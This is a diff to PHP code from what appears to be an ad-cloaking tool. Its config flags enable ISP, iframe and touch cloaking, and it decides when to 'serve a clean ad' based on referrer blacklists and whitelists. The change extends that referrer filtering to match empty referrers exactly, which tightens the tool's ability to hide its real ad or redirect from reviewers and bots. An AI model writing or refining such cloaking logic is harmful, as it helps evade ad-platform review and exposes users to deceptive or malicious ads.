@@ -217,8 +217,8 @@
 	$ispCloakingEnabled 			= array_key_exists("ISPCloakingEnabled", $adConfig) && $adConfig["ISPCloakingEnabled"] === "false" ? false : true;
 	$iframeCloakingEnabled 			= array_key_exists("IFrameCloakingEnabled", $adConfig) && $adConfig["IFrameCloakingEnabled"] === "false" ? false : true;
 	$touchCloakingEnabled 			= array_key_exists("TouchCloakingEnabled", $adConfig) && $adConfig["TouchCloakingEnabled"] === "false" ? false : true;
-	$blacklistedReferrers 			= array_key_exists("BlacklistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["BlacklistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
-	$whitelistedReferrers 			= array_key_exists("WhitelistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["WhitelistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : array();
+	$blacklistedReferrers 			= array_key_exists("BlacklistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["BlacklistedReferrers"], -1) : array();
+	$whitelistedReferrers 			= array_key_exists("WhitelistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["WhitelistedReferrers"], -1) : array();
 	$blockedParameterValues			= array_key_exists("BlockedParameterValues", $adConfig) ? json_decode($adConfig["BlockedParameterValues"]) : array();
 
 	if (empty($redirectUrl))
@@ -258,7 +258,21 @@
 	{
 		foreach ($blacklistedReferrers as $blackListedReferrer)
 		{
-			if (strpos($_SERVER['HTTP_REFERER'], $blackListedReferrer) !== false)
+			if ($_SERVER['HTTP_REFERER'] === "")
+			{
+				if ($_SERVER['HTTP_REFERER'] == $blackListedReferrer)
+				{
+					$serveCleanAd = true;
+
+					if ($loggingEnabled)
+					{
+						mbotlog($campaignID, $ip, $isp['isp'], "EMPTY Referrer is in blacklist.");
+					}
+
+					break;					
+				}
+			}
+			elseif (strpos($_SERVER['HTTP_REFERER'], $blackListedReferrer) !== false)
 			{
 				$serveCleanAd = true;
 
@@ -277,7 +291,16 @@
 
 			foreach ($whitelistedReferrers as $whitelistedReferrer)
 			{
-				if (strpos($_SERVER['HTTP_REFERER'], $whitelistedReferrer) !== false)
+				if ($_SERVER['HTTP_REFERER'] === "")
+				{
+					if ($_SERVER['HTTP_REFERER'] == $whitelistedReferrer)
+					{
+						$matchedWhitelistedReferrer = true;
+
+						break;
+					}
+				}
+				elseif (strpos($_SERVER['HTTP_REFERER'], $whitelistedReferrer) !== false)
 				{
 					$matchedWhitelistedReferrer = true;
 
